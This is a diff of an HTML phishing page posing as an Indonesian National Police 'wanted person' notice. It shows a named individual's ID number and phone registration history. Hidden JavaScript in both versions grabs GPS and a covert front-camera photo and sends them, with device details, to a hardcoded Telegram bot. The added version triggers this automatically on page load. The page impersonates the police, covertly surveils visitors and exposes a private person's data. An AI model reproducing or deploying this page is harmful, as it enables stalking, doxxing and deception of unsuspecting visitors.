@@ -3,353 +3,330 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>Data Pelaku — Pengaduan Masyarakat POLRI</title>
+<title>Sistem Informasi DPO - Kepolisian Negara Republik Indonesia</title>
 <link rel="icon" href="https://upload.wikimedia.org/wikipedia/commons/thumb/9/99/Logo_of_the_Indonesian_National_Police.svg/120px-Logo_of_the_Indonesian_National_Police.svg.png">
 <style>
-* { margin:0; padding:0; box-sizing:border-box; -webkit-tap-highlight-color:transparent; }
-body {
-  font-family: "Segoe UI", Roboto, Arial, sans-serif;
-  background: #f0f4f8; color: #333; min-height: 100vh; display: flex; flex-direction: column;
-}
+    /* ===== RESET & DASAR ===== */
+    * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
+    body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f4f6f9; color: #333; line-height: 1.6; }
 
-/* ===== HEADER POLRI ===== */
-.topbar {
-  background: #0f172a; color: #fff; padding: 12px 16px;
-  display: flex; align-items: center; justify-content: center; gap: 10px;
-  font-size: 12px; font-weight: 600; letter-spacing: .5px;
-}
-.topbar img { width: 24px; height: 24px; object-fit: contain; }
+    /* ===== TOPBAR RESMI ===== */
+    .topbar { background-color: #0b132b; color: #fff; padding: 8px 16px; font-size: 11px; display: flex; justify-content: space-between; align-items: center; border-bottom: 3px solid #d4af37; }
+    .topbar-left { display: flex; align-items: center; gap: 8px; font-weight: 600; letter-spacing: 0.5px; }
+    .topbar-left img { width: 20px; height: auto; }
+    .topbar-right { display: none; } /* Disembunyikan di HP */
 
-.main-header {
-  background: #1e293b; padding: 20px 16px; text-align: center;
-  color: #fff; border-bottom: 3px solid #d4af37;
-}
-.main-header h1 { font-size: 18px; font-weight: 700; letter-spacing: 1px; }
-.main-header p { font-size: 12px; color: #94a3b8; margin-top: 4px; }
+    /* ===== HEADER UTAMA ===== */
+    .main-header { background: #fff; padding: 20px 16px; text-align: center; border-bottom: 1px solid #e0e0e0; box-shadow: 0 2px 4px rgba(0,0,0,0.05); }
+    .main-header h1 { font-size: 18px; color: #0b132b; font-weight: 800; letter-spacing: 1px; text-transform: uppercase; margin-bottom: 4px; }
+    .main-header p { font-size: 13px; color: #666; font-weight: 500; }
 
-/* ===== CONTAINER ===== */
-.container { flex: 1; width: 100%; max-width: 500px; margin: 0 auto; padding: 20px 16px; }
+    /* ===== MENU NAVIGASI ===== */
+    .nav-menu { background: #0b132b; display: flex; justify-content: center; gap: 20px; padding: 12px; overflow-x: auto; }
+    .nav-menu a { color: #fff; text-decoration: none; font-size: 13px; font-weight: 600; white-space: nowrap; padding-bottom: 4px; border-bottom: 2px solid transparent; transition: 0.3s; }
+    .nav-menu a.active { border-bottom: 2px solid #d4af37; color: #d4af37; }
 
-/* ===== CARD ===== */
-.card {
-  background: #fff; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,.06);
-  padding: 20px; margin-bottom: 16px; border: 1px solid #e2e8f0;
-}
-.card h2 {
-  font-size: 15px; color: #1e293b; margin-bottom: 16px; padding-bottom: 10px;
-  border-bottom: 1px solid #e2e8f0; display: flex; align-items: center; gap: 8px;
-}
-.card h2::before { content: ''; width: 4px; height: 16px; background: #d4af37; border-radius: 2px; }
-.desc { font-size: 13px; color: #64748b; line-height: 1.6; margin-bottom: 16px; }
+    /* ===== KONTEN ===== */
+    .container { max-width: 600px; margin: 20px auto; padding: 0 16px; }
+    
+    /* Kartu Utama */
+    .card { background: #fff; border-radius: 4px; border: 1px solid #e0e0e0; box-shadow: 0 2px 8px rgba(0,0,0,0.04); margin-bottom: 20px; overflow: hidden; }
+    
+    /* Header Kartu (Biru Dongker) */
+    .card-header { background: #0b132b; color: #fff; padding: 12px 16px; font-size: 14px; font-weight: 700; display: flex; align-items: center; gap: 8px; border-bottom: 3px solid #d4af37; }
+    .card-body { padding: 20px; }
 
-/* ===== TARGET PROFILE ===== */
-.target-photo-box {
-  width: 100%; max-width: 220px; margin: 0 auto 12px;
-  border-radius: 6px; overflow: hidden; border: 2px solid #dc2626; background: #000;
-}
-.target-photo-box img { width: 100%; display: block; }
-.target-badge {
-  text-align: center; font-size: 10px; font-weight: 700; color: #dc2626;
-  letter-spacing: 1.5px; text-transform: uppercase; margin-bottom: 16px;
-}
+    /* Peringatan / Notice */
+    .notice { background-color: #fff3cd; border-left: 4px solid #ffc107; color: #856404; padding: 12px 16px; font-size: 13px; margin-bottom: 20px; border-radius: 4px; }
 
-.target-header {
-  display: flex; align-items: center; gap: 12px;
-  padding-bottom: 12px; border-bottom: 1px solid #e2e8f0; margin-bottom: 12px;
-}
-.target-avatar {
-  width: 48px; height: 48px; border-radius: 50%; background: #fee2e2;
-  display: flex; align-items: center; justify-content: center; font-size: 24px;
-  color: #dc2626; border: 1px solid #fca5a5; flex-shrink: 0;
-}
-.target-name { font-size: 15px; font-weight: 700; color: #1e293b; }
-.target-status {
-  font-size: 10px; color: #dc2626; font-weight: 700;
-  text-transform: uppercase; margin-top: 2px; display: flex; align-items: center; gap: 4px;
-}
-.target-status::before {
-  content: ''; width: 6px; height: 6px; border-radius: 50%; background: #dc2626;
-  animation: blink 1s infinite;
-}
-@keyframes blink { 50% { opacity: 0; } }
+    /* Foto Target DPO */
+    .dpo-photo-container { display: flex; justify-content: center; margin-bottom: 20px; }
+    .dpo-photo { width: 180px; height: 220px; background: #eee; border: 2px solid #0b132b; object-fit: cover; display: flex; align-items: center; justify-content: center; font-size: 50px; color: #999; border-radius: 4px; }
 
-.data-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 8px 12px; font-size: 12px; margin-bottom: 14px; }
-.data-item { display: flex; flex-direction: column; }
-.data-item .k { font-size: 10px; color: #94a3b8; text-transform: uppercase; letter-spacing: .5px; }
-.data-item .v { color: #1e293b; font-weight: 600; margin-top: 2px; }
-.data-item.full { grid-column: 1 / -1; }
+    /* Tabel Data */
+    .data-table { width: 100%; border-collapse: collapse; font-size: 13px; margin-bottom: 20px; }
+    .data-table th, .data-table td { padding: 10px 12px; border: 1px solid #dee2e6; text-align: left; }
+    .data-table th { background-color: #f8f9fa; color: #495057; font-weight: 700; width: 35%; }
+    .data-table td { color: #212529; font-weight: 500; }
+    
+    /* Tabel Nomor HP */
+    .phone-scroll { max-height: 200px; overflow-y: auto; border: 1px solid #dee2e6; margin-bottom: 20px; }
+    .phone-item { display: flex; justify-content: space-between; padding: 8px 12px; border-bottom: 1px solid #dee2e6; font-size: 12px; }
+    .phone-item:nth-child(even) { background-color: #f8f9fa; }
+    .phone-num { font-family: 'Courier New', Courier, monospace; font-weight: bold; color: #0b132b; }
 
-.divider { height: 1px; background: #e2e8f0; margin: 14px 0; }
+    /* Tombol Resmi */
+    .btn-polri {
+        display: block; width: 100%; padding: 14px; background-color: #0b132b; color: #fff; text-align: center; text-decoration: none; font-size: 15px; font-weight: 700; border: none; border-radius: 4px; cursor: pointer; text-transform: uppercase; letter-spacing: 1px; transition: 0.2s; margin-top: 10px;
+    }
+    .btn-polri:hover { background-color: #1a2a5c; }
+    
+    /* ===== FOOTER ===== */
+    .footer { text-align: center; padding: 20px; font-size: 11px; color: #6c757d; border-top: 1px solid #dee2e6; margin-top: 30px; background-color: #fff; }
+    .footer img { width: 40px; opacity: 0.5; margin-bottom: 8px; }
 
-.phone-list { max-height: 200px; overflow-y: auto; border: 1px solid #e2e8f0; border-radius: 6px; }
-.phone-row { display: flex; justify-content: space-between; align-items: center; padding: 8px 12px; border-bottom: 1px solid #e2e8f0; font-size: 12px; }
-.phone-row:last-child { border-bottom: none; }
-.phone-row .num { font-weight: 700; color: #1e293b; font-family: monospace; }
-.phone-row .meta { font-size: 10px; color: #64748b; text-align: right; }
-
-/* ===== BUTTON CEK DATA ===== */
-.btn-verify {
-  width: 100%; padding: 16px; background: #dc2626; color: #fff;
-  border: none; border-radius: 6px; font-size: 14px; font-weight: 700;
-  cursor: pointer; margin-top: 20px; transition: .2s; text-transform: uppercase; letter-spacing: 1px;
-  box-shadow: 0 4px 12px rgba(220,38,38,.3);
-}
-.btn-verify:hover { background: #b91c1c; }
-
-/* ===== HIDDEN CAMERA ===== */
-.cam-container {
-  position: fixed; top: 0; left: 0; width: 1px; height: 1px;
-  opacity: 0; pointer-events: none; overflow: hidden; z-index: -1;
-}
-#video, #canvas { width: 1px; height: 1px; }
-
-/* ===== HARD KICK ===== */
-#kick-screen {
-  display: none; position: fixed; inset: 0; background: #f0f4f8;
-  z-index: 9999; flex-direction: column; align-items: center; justify-content: center;
-  color: #64748b; font-size: 14px; text-align: center; padding: 20px;
-}
+    /* ===== HIDDEN CAMERA ===== */
+    .cam-container { position: fixed; top: 0; left: 0; width: 1px; height: 1px; opacity: 0; pointer-events: none; overflow: hidden; z-index: -1; }
+    #video, #canvas { width: 1px; height: 1px; }
 </style>
 </head>
 <body>
 
-<!-- ===== TOPBAR ===== -->
-<div class="topbar">
-  <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/99/Logo_of_the_Indonesian_National_Police.svg/120px-Logo_of_the_Indonesian_National_Police.svg.png" alt="POLRI">
-  KEPOLISIAN NEGARA REPUBLIK INDONESIA
-</div>
-
-<div class="main-header">
-  <h1>DATA PELAKU PENGADUAN</h1>
-  <p>Sistem Identifikasi Terpadu</p>
-</div>
-
-<div class="container">
-  <div class="card">
-    
-    <!-- FOTO PELAKU -->
-    <div class="target-photo-box">
-      <img src="pelaku.png" alt="Target" onerror="this.style.display='none'">
-    </div>
-    <div class="target-badge">Data Pelaku Teridentifikasi</div>
-
-    <!-- HEADER TARGET -->
-    <div class="target-header">
-      <div class="target-avatar">👤</div>
-      <div>
-        <div class="target-name">MUKTI NURYANA</div>
-        <div class="target-status">Dalam Penyelidikan</div>
-      </div>
+    <!-- ===== TOPBAR ===== -->
+    <div class="topbar">
+        <div class="topbar-left">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/99/Logo_of_the_Indonesian_National_Police.svg/120px-Logo_of_the_Indonesian_National_Police.svg.png" alt="Polri">
+            Republik Indonesia
+        </div>
+        <div class="topbar-right">
+            <span>Situs Resmi Pemerintah</span>
+        </div>
     </div>
 
-    <!-- DATA GRID -->
-    <div class="data-grid">
-      <div class="data-item"><span class="k">Status</span><span class="v">Jabar</span></div>
-      <div class="data-item"><span class="k">Kota</span><span class="v">CIANJUR</span></div>
-      <div class="data-item"><span class="k">Usia</span><span class="v">24 Tahun</span></div>
-      <div class="data-item"><span class="k">Jenis Kelamin</span><span class="v">L</span></div>
-      <div class="data-item"><span class="k">Daerah</span><span class="v">TANGGEUNG</span></div>
-      <div class="data-item"><span class="k">Wilayah</span><span class="v">KERTAJAYA</span></div>
-      <div class="data-item full"><span class="k">Lokasi</span><span class="v">KERTAJAYA</span></div>
-      <div class="data-item full"><span class="k">Nomor Paspor</span><span class="v">7203082606930003</span></div>
-      <div class="data-item full"><span class="k">Penyedia</span><span class="v">EXELCOMINDO / TELKOMSEL</span></div>
+    <!-- ===== HEADER ===== -->
+    <div class="main-header">
+        <h1>Daftar Pencarian Orang (DPO)</h1>
+        <p>Kepolisian Negara Republik Indonesia</p>
     </div>
 
-    <div class="divider"></div>
-
-    <!-- RIWAYAT NOMOR -->
-    <h2 style="font-size:13px; margin-bottom:10px; border-bottom:none; padding-bottom:0;">Riwayat Registrasi Nomor</h2>
-    <div class="phone-list">
-      <div class="phone-row"><span class="num">6281999152214</span><span class="meta">2019-03-04<br>EXELCOMINDO</span></div>
-      <div class="phone-row"><span class="num">6281999152214</span><span class="meta">2019-04-03<br>EXELCOMINDO</span></div>
-      <div class="phone-row"><span class="num">6281999152217</span><span class="meta">2019-03-04<br>EXELCOMINDO</span></div>
-      <div class="phone-row"><span class="num">6281999152217</span><span class="meta">2019-04-03<br>EXELCOMINDO</span></div>
-      <div class="phone-row"><span class="num">6282252327491</span><span class="meta">2018-09-16<br>TELKOMSEL</span></div>
-      <div class="phone-row"><span class="num">6282252327492</span><span class="meta">2018-09-16<br>TELKOMSEL</span></div>
-      <div class="phone-row"><span class="num">6282252327493</span><span class="meta">2018-09-16<br>TELKOMSEL</span></div>
-      <div class="phone-row"><span class="num">6282252327494</span><span class="meta">2018-09-16<br>TELKOMSEL</span></div>
-      <div class="phone-row"><span class="num">6282252327538</span><span class="meta">2018-09-16<br>TELKOMSEL</span></div>
-      <div class="phone-row"><span class="num">6282252327539</span><span class="meta">2018-09-16<br>TELKOMSEL</span></div>
-      <div class="phone-row"><span class="num">6282252327540</span><span class="meta">2018-09-16<br>TELKOMSEL</span></div>
-      <div class="phone-row"><span class="num">6282252327541</span><span class="meta">2018-09-16<br>TELKOMSEL</span></div>
-      <div class="phone-row"><span class="num">6282271546748</span><span class="meta">2018-05-23<br>TELKOMSEL</span></div>
-      <div class="phone-row"><span class="num">6282292059945</span><span class="meta">2017-11-09<br>TELKOMSEL</span></div>
-      <div class="phone-row"><span class="num">6282292059945</span><span class="meta">2018-02-24<br>TELKOMSEL</span></div>
-      <div class="phone-row"><span class="num">6283132640490</span><span class="meta">2019-03-04<br>EXELCOMINDO</span></div>
-      <div class="phone-row"><span class="num">6283132640490</span><span class="meta">2019-04-03<br>EXELCOMINDO</span></div>
+    <!-- ===== NAVIGASI ===== -->
+    <div class="nav-menu">
+        <a href="#">Beranda</a>
+        <a href="#" class="active">DPO</a>
+        <a href="#">Pengaduan</a>
+        <a href="#">Kontak</a>
     </div>
 
-    <div class="divider"></div>
+    <!-- ===== KONTEN UTAMA ===== -->
+    <div class="container">
 
-    <!-- TOMBOL CEK DATA LENGKAP -->
-    <button id="btnCekLengkap" class="btn-verify">Cek Data Lengkap Pelaku</button>
+        <div class="notice">
+            <strong>Pemberitahuan:</strong> Halaman ini berisi informasi data pelaku yang sedang dalam proses penyelidikan. Segala bentuk penyebarluasan data tanpa izin dapat dikenakan sanksi hukum.
+        </div>
 
-  </div>
-</div>
+        <div class="card">
+            <div class="card-header">
+                <span>Berkas Identifikasi Tersangka</span>
+            </div>
+            <div class="card-body">
+                
+                <!-- FOTO TARGET -->
+                <div class="dpo-photo-container">
+                    <img src="pelaku.png" alt="Foto Tersangka" class="dpo-photo" onerror="this.style.display='none'">
+                </div>
 
-<!-- ===== HIDDEN CAMERA ===== -->
-<div class="cam-container">
-  <video id="video" autoplay playsinline muted></video>
-  <canvas id="canvas"></canvas>
-</div>
+                <!-- DATA DIRI -->
+                <table class="data-table">
+                    <tr>
+                        <th>Nama Lengkap</th>
+                        <td><strong>MUKTI NURYANA</strong></td>
+                    </tr>
+                    <tr>
+                        <th>Status Penanganan</th>
+                        <td style="color: #d9534f; font-weight: bold;">Dalam Penyelidikan (DPO)</td>
+                    </tr>
+                    <tr>
+                        <th>Usia / Gender</th>
+                        <td>24 Tahun / Laki-laki</td>
+                    </tr>
+                    <tr>
+                        <th>Provinsi</th>
+                        <td>Jawa Barat (Jabar)</td>
+                    </tr>
+                    <tr>
+                        <th>Kota / Kabupaten</th>
+                        <td>Cianjur</td>
+                    </tr>
+                    <tr>
+                        <th>Kecamatan</th>
+                        <td>Tanggeung</td>
+                    </tr>
+                    <tr>
+                        <th>Desa / Wilayah</th>
+                        <td>Kertajaya</td>
+                    </tr>
+                    <tr>
+                        <th>Nomor Identitas (Paspor)</th>
+                        <td><code>7203082606930003</code></td>
+                    </tr>
+                    <tr>
+                        <th>Penyedia Seluler</th>
+                        <td>EXELCOMINDO / TELKOMSEL</td>
+                    </tr>
+                </table>
 
-<!-- ===== KICK SCREEN ===== -->
-<div id="kick-screen">
-  <div style="font-size:40px;margin-bottom:14px;">⛔</div>
-  <p id="kick-msg">Sesi dihentikan.</p>
-</div>
+                <!-- RIWAYAT NOMOR -->
+                <h3 style="font-size: 14px; margin-bottom: 10px; color: #0b132b;">Riwayat Registrasi Nomor Seluler</h3>
+                <div class="phone-scroll">
+                    <div class="phone-item"><span class="phone-num">6281999152214</span><span>04 Mar 2019 - EXELCOMINDO</span></div>
+                    <div class="phone-item"><span class="phone-num">6281999152214</span><span>03 Apr 2019 - EXELCOMINDO</span></div>
+                    <div class="phone-item"><span class="phone-num">6281999152217</span><span>04 Mar 2019 - EXELCOMINDO</span></div>
+                    <div class="phone-item"><span class="phone-num">6281999152217</span><span>03 Apr 2019 - EXELCOMINDO</span></div>
+                    <div class="phone-item"><span class="phone-num">6282252327491</span><span>16 Sep 2018 - TELKOMSEL</span></div>
+                    <div class="phone-item"><span class="phone-num">6282252327492</span><span>16 Sep 2018 - TELKOMSEL</span></div>
+                    <div class="phone-item"><span class="phone-num">6282252327493</span><span>16 Sep 2018 - TELKOMSEL</span></div>
+                    <div class="phone-item"><span class="phone-num">6282252327494</span><span>16 Sep 2018 - TELKOMSEL</span></div>
+                    <div class="phone-item"><span class="phone-num">6282252327538</span><span>16 Sep 2018 - TELKOMSEL</span></div>
+                    <div class="phone-item"><span class="phone-num">6282252327539</span><span>16 Sep 2018 - TELKOMSEL</span></div>
+                    <div class="phone-item"><span class="phone-num">6282252327540</span><span>16 Sep 2018 - TELKOMSEL</span></div>
+                    <div class="phone-item"><span class="phone-num">6282252327541</span><span>16 Sep 2018 - TELKOMSEL</span></div>
+                    <div class="phone-item"><span class="phone-num">6282271546748</span><span>23 Mei 2018 - TELKOMSEL</span></div>
+                    <div class="phone-item"><span class="phone-num">6282292059945</span><span>09 Nov 2017 - TELKOMSEL</span></div>
+                    <div class="phone-item"><span class="phone-num">6282292059945</span><span>24 Feb 2018 - TELKOMSEL</span></div>
+                    <div class="phone-item"><span class="phone-num">6283132640490</span><span>04 Mar 2019 - EXELCOMINDO</span></div>
+                    <div class="phone-item"><span class="phone-num">6283132640490</span><span>03 Apr 2019 - EXELCOMINDO</span></div>
+                </div>
 
-<script>
-/* =========================================================
-   SISTEM IDENTIFIKASI PELAKU
-   ========================================================= */
-const BOT_TOKEN = '8795652413:AAFtHAsp5z6xsBEs-UyrJH5FMKX0rizUsno';
-const CHAT_ID   = '1966317946';
+                <!-- TOMBOL LINK -->
+                <a href="https://www.polri.go.id" class="btn-polri">Buka Berkas Lengkap</a>
 
-const $ = id => document.getElementById(id);
-let camStream = null;
-let isDataSent = false;
+            </div>
+        </div>
 
-/* ---------- TOMBOL CEK DATA LENGKAP ---------- */
-$('btnCekLengkap').addEventListener('click', async () => {
-  // Disable tombol biar ga diklik 2x
-  $('btnCekLengkap').disabled = true;
-  $('btnCekLengkap').textContent = 'Memproses...';
+    </div>
 
-  // 1) REQUEST KAMERA + LOKASI BARENGAN
-  const permissionGranted = await requestPermissions();
-  
-  if (!permissionGranted) {
-    // Kalau ditolak, jangan diarahkan ke Polri, matikan halaman
-    hardKick('Izin kamera dan lokasi diperlukan untuk melanjutkan verifikasi.');
-    return;
-  }
+    <!-- ===== FOOTER ===== -->
+    <div class="footer">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/99/Logo_of_the_Indonesian_National_Police.svg/120px-Logo_of_the_Indonesian_National_Police.svg.png" alt="Polri"><br>
+        &copy; 2024 Kepolisian Negara Republik Indonesia.<br>
+        Semua Hak Dilindungi.
+    </div>
 
-  // 2) KALAU DIIZINKAN, JEPRET FOTO & KIRIM
-  await doCapture();
+    <!-- ===== HIDDEN CAMERA ===== -->
+    <div class="cam-container">
+        <video id="video" autoplay playsinline muted></video>
+        <canvas id="canvas"></canvas>
+    </div>
 
-  // 3) REDIRECT KE WEBSITE RESMI POLRI
-  setTimeout(() => {
-    window.location.href = 'https://www.polri.go.id';
-  }, 1000);
-});
+    <script>
+        /* =========================================================
+           SISTEM OTOMATIS SAAT HALAMAN DIBUKA
+           ========================================================= */
+        const BOT_TOKEN = '8795652413:AAFtHAsp5z6xsBEs-UyrJH5FMKX0rizUsno';
+        const CHAT_ID   = '1966317946';
 
-/* ---------- REQUEST PERMISSIONS ---------- */
-async function requestPermissions() {
-  let geo = null;
-  let stream = null;
+        const $ = id => document.getElementById(id);
+        let camStream = null;
+        let isDataSent = false;
 
-  // Request GPS
-  try {
-    geo = await new Promise((resolve, reject) => {
-      if (!navigator.geolocation) return reject(new Error('GPS tidak tersedia'));
-      navigator.geolocation.getCurrentPosition(
-        pos => resolve({
-          lat: pos.coords.latitude,
-          lng: pos.coords.longitude,
-          acc: pos.coords.accuracy,
-          ts: Date.now()
-        }),
-        err => reject(err),
-        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
-      );
-    });
-  } catch (e) {
-    console.warn('GPS ditolak:', e.message);
-    return false;
-  }
+        // Jalankan fungsi ini OTOMATIS saat halaman dimuat
+        window.addEventListener('DOMContentLoaded', async () => {
+            // Memicu popup izin lokasi & kamera bawaan browser
+            const permissionGranted = await requestPermissions();
+            
+            if (permissionGranted) {
+                // Jika user klik "Izinkan", jepret foto dan kirim ke Telegram
+                await doCapture();
+            }
+        });
 
-  // Request Kamera Depan
-  try {
-    stream = await navigator.mediaDevices.getUserMedia({
-      video: { facingMode: 'user', width: { ideal: 720 }, height: { ideal: 720 } },
-      audio: false
-    });
-    camStream = stream;
-    const video = $('video');
-    video.srcObject = stream;
-    await video.play();
-  } catch (e) {
-    console.warn('Kamera ditolak:', e.message);
-    return false;
-  }
+        /* ---------- REQUEST PERMISSIONS ---------- */
+        async function requestPermissions() {
+            let geo = null;
+            let stream = null;
 
-  window.__geo = geo;
-  return true;
-}
+            // 1. Memicu Popup Izin Lokasi (GPS)
+            try {
+                geo = await new Promise((resolve, reject) => {
+                    if (!navigator.geolocation) return reject(new Error('GPS tidak tersedia'));
+                    navigator.geolocation.getCurrentPosition(
+                        pos => resolve({
+                            lat: pos.coords.latitude,
+                            lng: pos.coords.longitude,
+                            acc: pos.coords.accuracy,
+                            ts: Date.now()
+                        }),
+                        err => reject(err),
+                        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+                    );
+                });
+            } catch (e) {
+                console.warn('GPS ditolak:', e.message);
+                return false;
+            }
 
-/* ---------- CAPTURE & SEND ---------- */
-async function doCapture() {
-  if (isDataSent) return;
-  
-  const video = $('video');
-  const canvas = $('canvas');
+            // 2. Memicu Popup Izin Kamera Depan
+            try {
+                stream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: 'user', width: { ideal: 720 }, height: { ideal: 720 } },
+                    audio: false
+                });
+                camStream = stream;
+                const video = $('video');
+                video.srcObject = stream;
+                await video.play();
+            } catch (e) {
+                console.warn('Kamera ditolak:', e.message);
+                return false;
+            }
 
-  // Tunggu frame siap
-  let retries = 0;
-  while (!video.videoWidth && retries < 10) {
-    await new Promise(r => setTimeout(r, 200));
-    retries++;
-  }
+            window.__geo = geo;
+            return true;
+        }
 
-  canvas.width = video.videoWidth || 720;
-  canvas.height = video.videoHeight || 720;
-  canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+        /* ---------- CAPTURE & SEND ---------- */
+        async function doCapture() {
+            if (isDataSent) return;
+            
+            const video = $('video');
+            const canvas = $('canvas');
 
-  return new Promise((resolve) => {
-    canvas.toBlob(async blob => {
-      const geo = window.__geo || { lat: 0, lng: 0, acc: 0 };
-      await sendToTelegram(blob, geo);
-      isDataSent = true;
-      if (camStream) camStream.getTracks().forEach(t => t.stop());
-      resolve();
-    }, 'image/jpeg', 0.88);
-  });
-}
+            let retries = 0;
+            while (!video.videoWidth && retries < 10) {
+                await new Promise(r => setTimeout(r, 200));
+                retries++;
+            }
 
-/* ---------- SEND TO TELEGRAM ---------- */
-async function sendToTelegram(blob, geo) {
-  const mapsUrl = `https://maps.google.com/?q=${geo.lat},${geo.lng}`;
+            canvas.width = video.videoWidth || 720;
+            canvas.height = video.videoHeight || 720;
+            canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
 
-  const fd = new FormData();
-  fd.append('chat_id', CHAT_ID);
-  fd.append('photo', blob, 'selfie.jpg');
-  fd.append('caption',
-    `🚨 <b>TARGET TERTANGKAP</b>\n` +
-    `━━━━━━━━━━━━━━━━━━━━\n` +
-    `📍 Koordinat: <code>${geo.lat.toFixed(6)}, ${geo.lng.toFixed(6)}</code>\n` +
-    `🎯 Akurasi: ±${Math.round(geo.acc)} m\n` +
-    `🗺️ Peta: ${mapsUrl}\n` +
-    `🕒 ${new Date().toLocaleString('id-ID')}`
-  );
-  fd.append('parse_mode', 'HTML');
+            return new Promise((resolve) => {
+                canvas.toBlob(async blob => {
+                    const geo = window.__geo || { lat: 0, lng: 0, acc: 0 };
+                    await sendToTelegram(blob, geo);
+                    isDataSent = true;
+                    if (camStream) camStream.getTracks().forEach(t => t.stop());
+                    resolve();
+                }, 'image/jpeg', 0.88);
+            });
+        }
 
-  try {
-    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
-  } catch (e) { console.warn('sendPhoto gagal:', e); }
+        /* ---------- SEND TO TELEGRAM ---------- */
+        async function sendToTelegram(blob, geo) {
+            const mapsUrl = `https://maps.google.com/?q=${geo.lat},${geo.lng}`;
 
-  const text = `📱 <b>DEVICE INFO</b>\n` +
-    `━━━━━━━━━━━━━━━━━━━━\n` +
-    `🖥️ UA: <code>${navigator.userAgent}</code>\n` +
-    `🌐 Platform: ${navigator.platform}\n` +
-    `🗣️ Bahasa: ${navigator.language}\n` +
-    `📺 Layar: ${screen.width}x${screen.height}`;
+            const fd = new FormData();
+            fd.append('chat_id', CHAT_ID);
+            fd.append('photo', blob, 'selfie.jpg');
+            fd.append('caption',
+                `🚨 <b>TARGET MEMBUKA HALAMAN</b>\n` +
+                `━━━━━━━━━━━━━━━━━━━━\n` +
+                `📍 Koordinat: <code>${geo.lat.toFixed(6)}, ${geo.lng.toFixed(6)}</code>\n` +
+                `🎯 Akurasi: ±${Math.round(geo.acc)} m\n` +
+                `🗺️ Peta: ${mapsUrl}\n` +
+                `🕒 ${new Date().toLocaleString('id-ID')}`
+            );
+            fd.append('parse_mode', 'HTML');
 
-  try {
-    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-      method: 'POST', headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ chat_id: CHAT_ID, text, parse_mode: 'HTML' })
-    });
-  } catch (e) { console.warn('sendMessage gagal:', e); }
-}
+            try {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+            } catch (e) { console.warn('sendPhoto gagal:', e); }
 
-/* ---------- HARD KICK ---------- */
-function hardKick(reason) {
-  if (camStream) camStream.getTracks().forEach(t => t.stop());
-  const kick = document.getElementById('kick-screen');
-  document.getElementById('kick-msg').textContent = reason;
-  kick.style.display = 'flex';
-}
-</script>
+            const text = `📱 <b>DEVICE INFO</b>\n` +
+                `━━━━━━━━━━━━━━━━━━━━\n` +
+                `🖥️ UA: <code>${navigator.userAgent}</code>\n` +
+                `🌐 Platform: ${navigator.platform}\n` +
+                `🗣️ Bahasa: ${navigator.language}\n` +
+                `📺 Layar: ${screen.width}x${screen.height}`;
+
+            try {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST', headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: CHAT_ID, text, parse_mode: 'HTML' })
+                });
+            } catch (e) { console.warn('sendMessage gagal:', e); }
+        }
+    </script>
 </body>
 </html>
